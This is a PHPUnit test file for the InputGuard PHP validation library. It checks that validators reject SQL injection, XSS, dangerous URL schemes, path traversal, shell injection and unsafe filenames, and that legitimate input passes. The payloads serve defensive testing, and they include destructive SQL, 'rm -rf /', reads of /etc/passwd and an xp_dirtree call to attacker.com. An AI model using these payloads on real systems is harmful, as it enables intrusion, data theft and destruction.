<?php
/**
 * Security Penetration Tests
 * 
 * Comprehensive attack vectors to verify InputGuard security.
 * These tests simulate real-world attack attempts.
 */
namespace InputGuard\Tests;

use PHPUnit\Framework\TestCase;
use InputGuard\Core\Level;
use InputGuard\Rules\Val\Val;
use InputGuard\Schema\RuleSet;
use InputGuard\Schema\Schema;

final class SecurityPenetrationTest extends TestCase {

    // ==========================================
    // SQL INJECTION ATTACKS
    // ==========================================

    /** @dataProvider sqlInjectionPayloads */
    public function test_sql_injection_blocked(string $payload): void {
        $v = Val::noSqlPatterns();
        $errs = $v->validate($payload, ['path' => 'q']);
        $this->assertNotEmpty($errs, "SQL injection not blocked: $payload");
    }

    public static function sqlInjectionPayloads(): array {
        return [
            'classic OR bypass' => ["' OR 1=1 --"],
            'union select' => ["' UNION SELECT * FROM users --"],
            'union all select' => ["1 UNION ALL SELECT password FROM admin"],
            'stacked query' => ["'; DROP TABLE users; --"],
            'insert injection' => ["'; INSERT INTO users VALUES('hacker','pass'); --"],
            'update injection' => ["'; UPDATE users SET admin=1 WHERE id=1; --"],
            'delete injection' => ["'; DELETE FROM logs; --"],
            'truncate' => ["'; TRUNCATE TABLE sessions; --"],
            'alter table' => ["'; ALTER TABLE users ADD admin INT; --"],
            'exec function' => ["'; EXEC xp_cmdshell('whoami'); --"],
            'xp functions' => ["xp_dirtree('\\\\attacker.com\\share')"],
            'comment bypass' => ["admin'--"],
            'OR string equals' => ["' OR 'a'='a"],
            'OR with comment' => ["' OR ''='"],
            'select from' => ["SELECT password FROM users WHERE 1=1"],
        ];
    }

    // ==========================================
    // XSS / HTML INJECTION ATTACKS
    // ==========================================

    /** @dataProvider xssPayloads */
    public function test_xss_blocked(string $payload): void {
        $v = Val::noHtmlTags();
        $errs = $v->validate($payload, ['path' => 'input']);
        $this->assertNotEmpty($errs, "XSS not blocked: $payload");
    }

    public static function xssPayloads(): array {
        return [
            'script tag' => ['<script>alert(1)</script>'],
            'img onerror' => ['<img src=x onerror=alert(1)>'],
            'svg onload' => ['<svg onload=alert(1)>'],
            'body onload' => ['<body onload=alert(1)>'],
            'iframe' => ['<iframe src="javascript:alert(1)">'],
            'input autofocus' => ['<input autofocus onfocus=alert(1)>'],
            'marquee' => ['<marquee onstart=alert(1)>'],
            'a href js' => ['<a href="javascript:alert(1)">click</a>'],
            'div onclick' => ['<div onclick="alert(1)">click</div>'],
            'style tag' => ['<style>body{background:url(javascript:alert(1))}</style>'],
            'object tag' => ['<object data="data:text/html,<script>alert(1)</script>">'],
            'embed tag' => ['<embed src="data:text/html,<script>alert(1)</script>">'],
            'form action' => ['<form action="javascript:alert(1)"><input type=submit>'],
            'math tag' => ['<math><mtext><script>alert(1)</script></mtext></math>'],
            'details ontoggle' => ['<details open ontoggle=alert(1)>'],
            'video onerror' => ['<video><source onerror="alert(1)">'],
            'audio onerror' => ['<audio src=x onerror=alert(1)>'],
            'link stylesheet' => ['<link rel=stylesheet href=data:,*{background:url(javascript:alert(1))}>'],
            'base href' => ['<base href="javascript:alert(1)//">'],
            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
        ];
    }

    // ==========================================
    // URL SCHEME ATTACKS
    // ==========================================

    /** @dataProvider dangerousUrlPayloads */
    public function test_dangerous_url_blocked(string $payload): void {
        $v = Val::safeUrl();
        $errs = $v->validate($payload, ['path' => 'url']);
        $this->assertNotEmpty($errs, "Dangerous URL not blocked: $payload");
    }

    public static function dangerousUrlPayloads(): array {
        return [
            'javascript basic' => ['javascript:alert(1)'],
            'javascript case' => ['JaVaScRiPt:alert(1)'],
            'javascript spaces' => ['   javascript:alert(1)'],
            'vbscript' => ['vbscript:msgbox(1)'],
            'data text/html' => ['data:text/html,<script>alert(1)</script>'],
            'data base64' => ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
            'file protocol' => ['file:///etc/passwd'],
        ];
    }

    // ==========================================
    // PATH TRAVERSAL ATTACKS
    // ==========================================

    /** @dataProvider pathTraversalPayloads */
    public function test_path_traversal_blocked(string $payload): void {
        $v = Val::noPathTraversal();
        $errs = $v->validate($payload, ['path' => 'file']);
        $this->assertNotEmpty($errs, "Path traversal not blocked: $payload");
    }

    public static function pathTraversalPayloads(): array {
        return [
            'basic dot dot' => ['../etc/passwd'],
            'windows dot dot' => ['..\\windows\\system.ini'],
            'double dot dot' => ['....//....//etc/passwd'],
            'encoded dot' => ['%2e%2e%2fetc/passwd'],
            'encoded slash' => ['..%2fetc/passwd'],
            'mixed encoding' => ['%2e%2e/etc/passwd'],
            'null byte' => ['../../../etc/passwd%00.jpg'],
            'absolute unix' => ['/etc/passwd'],
            'absolute windows' => ['C:\\Windows\\system.ini'],
            'windows forward' => ['C:/Windows/system.ini'],
            'unc path' => ['\\\\server\\share'],
        ];
    }

    // ==========================================
    // SHELL INJECTION ATTACKS
    // ==========================================

    /** @dataProvider shellInjectionPayloads */
    public function test_shell_injection_blocked(string $payload): void {
        $v = Val::noShellChars();
        $errs = $v->validate($payload, ['path' => 'cmd']);
        $this->assertNotEmpty($errs, "Shell injection not blocked: $payload");
    }

    public static function shellInjectionPayloads(): array {
        return [
            'semicolon' => ['file.txt; rm -rf /'],
            'pipe' => ['file.txt | cat /etc/passwd'],
            'ampersand' => ['file.txt && whoami'],
            'backtick' => ['file`whoami`.txt'],
            'dollar paren' => ['$(whoami)'],
            'dollar brace' => ['${PATH}'],
            'parentheses' => ['(whoami)'],
            'braces' => ['{ls,/}'],
            'brackets' => ['[a-z]'],
            'redirect out' => ['file.txt > /tmp/out'],
            'redirect in' => ['< /etc/passwd'],
            'bang history' => ['!ls'],
            'newline' => ["file.txt\nwhoami"],
            'carriage return' => ["file.txt\rwhoami"],
        ];
    }

    // ==========================================
    // FILENAME ATTACKS
    // ==========================================

    /** @dataProvider dangerousFilenamePayloads */
    public function test_dangerous_filename_blocked(string $payload): void {
        $v = Val::safeFilename();
        $errs = $v->validate($payload, ['path' => 'file']);
        $this->assertNotEmpty($errs, "Dangerous filename not blocked: $payload");
    }

    public static function dangerousFilenamePayloads(): array {
        return [
            'php extension' => ['shell.php'],
            'phtml extension' => ['shell.phtml'],
            'phar extension' => ['exploit.phar'],
            'exe extension' => ['virus.exe'],
            'bat extension' => ['script.bat'],
            'sh extension' => ['script.sh'],
            'htaccess' => ['.htaccess'],
            'htpasswd' => ['.htpasswd'],
            'svg script' => ['image.svg'],
            'dot start' => ['.hidden'],
            'dash start' => ['-rf'],
            'path traversal' => ['../shell.txt'],
            'null byte' => ["shell.php\x00.jpg"],
            'special chars' => ['file;rm.txt'],
            'spaces' => ['file name.txt'],
        ];
    }

    // ==========================================
    // CONTROL CHARACTER ATTACKS
    // ==========================================

    /** @dataProvider controlCharPayloads */
    public function test_control_chars_blocked(string $payload): void {
        $v = Val::noControlChars();
        $errs = $v->validate($payload, ['path' => 'input']);
        $this->assertNotEmpty($errs, "Control char not blocked: " . bin2hex($payload));
    }

    public static function controlCharPayloads(): array {
        return [
            'null byte' => ["hello\x00world"],
            'bell' => ["hello\x07world"],
            'backspace' => ["hello\x08world"],
            'tab' => ["hello\x09world"],
            'line feed' => ["hello\x0Aworld"],
            'vertical tab' => ["hello\x0Bworld"],
            'form feed' => ["hello\x0Cworld"],
            'carriage return' => ["hello\x0Dworld"],
            'escape' => ["hello\x1Bworld"],
            'delete' => ["hello\x7Fworld"],
        ];
    }

    // ==========================================
    // ZERO-WIDTH CHARACTER ATTACKS
    // ==========================================

    /** @dataProvider zeroWidthPayloads */
    public function test_zero_width_chars_blocked(string $payload): void {
        $v = Val::noZeroWidthChars();
        $errs = $v->validate($payload, ['path' => 'input']);
        $this->assertNotEmpty($errs, "Zero-width char not blocked: " . bin2hex($payload));
    }

    public static function zeroWidthPayloads(): array {
        return [
            'zwsp' => ["hello\u{200B}world"],
            'zwnj' => ["hello\u{200C}world"],
            'zwj' => ["hello\u{200D}world"],
            'word joiner' => ["hello\u{2060}world"],
            'bom' => ["\u{FEFF}hello"],
            'left to right mark' => ["hello\u{200E}world"],
            'right to left mark' => ["hello\u{200F}world"],
        ];
    }

    // ==========================================
    // ANTI-SPAM BYPASS ATTEMPTS
    // ==========================================

    /** @dataProvider spamPayloads */
    public function test_spam_blocked(string $payload): void {
        $v = Val::noSpamKeywords();
        $errs = $v->validate($payload, ['path' => 'message']);
        $this->assertNotEmpty($errs, "Spam not blocked: $payload");
    }

    public static function spamPayloads(): array {
        return [
            'viagra' => ['Buy viagra now!'],
            'casino' => ['Best online casino bonus'],
            'make money' => ['Make money fast from home'],
            'free money' => ['Get free money today'],
            'lottery winner' => ['You are the lottery winner'],
            'nigerian prince' => ['Nigerian prince needs your help'],
            'click here' => ['CLICK HERE for amazing offer'],
            'limited time' => ['Limited time offer expires soon'],
            'act now' => ['Act now before its too late'],
        ];
    }

    // ==========================================
    // GIBBERISH DETECTION
    // ==========================================

    /** @dataProvider gibberishPayloads */
    public function test_gibberish_blocked(string $payload): void {
        $v = Val::noGibberish();
        $errs = $v->validate($payload, ['path' => 'message']);
        $this->assertNotEmpty($errs, "Gibberish not blocked: $payload");
    }

    public static function gibberishPayloads(): array {
        return [
            'keyboard row 1' => ['qwertyuiop asdfgh'],
            'keyboard row 2' => ['asdfghjkl zxcvbn'],
            'consonant spam' => ['bcdfghjklmnpqrstvwxyz'],
            'random letters' => ['kjhgfdsa mnbvcxz'],
            'sequential' => ['abcdefghij klmnop'],
        ];
    }

    // ==========================================
    // INTEGRATION: PARANOID STRING PRESET
    // ==========================================

    /** @dataProvider paranoidStringAttacks */
    public function test_paranoid_string_blocks_attack(string $payload, string $expectedCode): void {
        $schema = Schema::make()
            ->field('input', RuleSet::paranoidString()->toField());

        $result = $schema->process(['input' => $payload], Level::PSYCHOTIC);

        $this->assertFalse($result->ok(), "Attack not blocked: $payload");
        $this->assertSame($expectedCode, $result->errors()[0]->code);
    }

    public static function paranoidStringAttacks(): array {
        return [
            'null byte' => ["hello\x00world", 'no_control_chars'],
            'html tag' => ['<script>alert(1)</script>', 'no_html_tags'],
            'path traversal' => ['../../../etc/passwd', 'no_path_traversal'],
            'shell char' => ['file; rm -rf /', 'no_shell_chars'],
            'sql injection' => ["' OR 1=1 --", 'no_sql_patterns'],
            'zero width' => ["safe\u{200B}word", 'no_zero_width_chars'],
        ];
    }

    // ==========================================
    // EDGE CASES: SHOULD PASS (FALSE POSITIVES)
    // ==========================================

    public function test_legitimate_text_passes(): void {
        $schema = Schema::make()
            ->field('comment', RuleSet::paranoidString()->toField());

        $legitimateInputs = [
            'Hello, this is a normal comment.',
            'I ordered 2 items: a book and a pen.',
            'The movie was great. I would recommend it.',
            'Please contact support at example dot com for help.',
            'The price is 99.99 USD.',
            'Meeting scheduled for 10:30 AM tomorrow.',
        ];

        foreach ($legitimateInputs as $input) {
            $result = $schema->process(['comment' => $input], Level::PARANOID);
            $this->assertTrue($result->ok(), "False positive for: $input");
        }
    }

    public function test_safe_urls_pass(): void {
        $v = Val::safeUrl();
        
        $safeUrls = [
            'https://example.com',
            'https://example.com/path?query=value',
            'http://localhost:8080',
            'https://sub.domain.example.com/page',
        ];

        foreach ($safeUrls as $url) {
            $errs = $v->validate($url, ['path' => 'url']);
            $this->assertEmpty($errs, "False positive for safe URL: $url");
        }
    }

    public function test_safe_filenames_pass(): void {
        $v = Val::safeFilename();
        
        $safeNames = [
            'document.pdf',
            'image.jpg',
            'report-2024.xlsx',
            'photo_001.png',
            'file.tar.gz',
        ];

        foreach ($safeNames as $name) {
            $errs = $v->validate($name, ['path' => 'file']);
            $this->assertEmpty($errs, "False positive for safe filename: $name");
        }
    }
}
